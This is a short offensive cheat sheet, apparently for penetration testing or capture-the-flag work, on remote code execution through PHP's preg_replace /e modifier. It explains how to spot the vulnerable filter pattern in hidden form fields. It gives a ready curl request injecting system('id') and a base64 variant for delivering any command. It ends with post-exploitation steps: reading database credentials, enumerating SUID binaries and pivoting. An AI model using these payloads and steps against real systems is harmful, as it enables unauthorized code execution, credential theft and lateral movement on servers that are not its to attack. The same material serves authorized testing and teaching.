# PHP `preg_replace` `/e` Modifier RCE

## When this applies

- Legacy PHP (`< 7.0`; the `/e` modifier was removed in PHP 7) and the app calls
  `preg_replace($pattern, $replacement, $subject)` where **the attacker controls
  the pattern, the replacement, or both**.
- Common shape: a configurable filter/substitution feature — profanity filters,
  templating, search-and-replace — that ships pattern→replacement pairs as form
  fields or config, e.g. an array `filters[/regex/i] = replacement`.
- With the `e` flag, PHP evaluates the *replacement* string as PHP code after
  match substitution. Controlling the replacement (or being able to append `e`
  to the pattern's modifier list) yields arbitrary code execution.

## Recognising the sink

Hidden form inputs whose **names are regexes** are the tell:

```html
<input type="hidden" name="swearwords[/fuck/i]" value="make love">
```

The backend iterates: `foreach($filters as $pat=>$rep) $msg = preg_replace($pat, $rep, $msg);`
You submit your own `filters[/<pattern>/e] = <php code>` pair plus a `$msg` that
matches `<pattern>`.

## Exploit

Add a pair where the modifier is `e` and the replacement is PHP, and make the
subject match the pattern so the replacement fires:

```bash
curl -s -b "$SESSION" "http://<TARGET>/feature.php" \
  --data-urlencode "message=findme" \
  --data-urlencode "filters[/findme/e]=system('id')"
```

Robust command delivery (avoids quoting/charset issues in the replacement):

```
filters[/findme/e]=system(base64_decode('<base64-of-command>'))
```

The command output is rendered wherever the substituted `$msg` is echoed.

## Notes

- Both pattern and replacement may be attacker-supplied; you only need `e` in
  the pattern's modifier suffix and PHP in the replacement.
- A `/opt/source/php-5.x` tree, `php5`, or `mysqli_*`-era code in stack traces
  confirms the old interpreter where `/e` is live.
- Post-RCE on `www-data`: read app config for DB creds, enumerate SUID binaries
  and listening services, then pivot. The replacement runs in the web user's
  context.
- PHP 7+ alternative: `preg_replace_callback` misuse or `assert()`/`create_function`
  sinks — `/e` itself is gone.
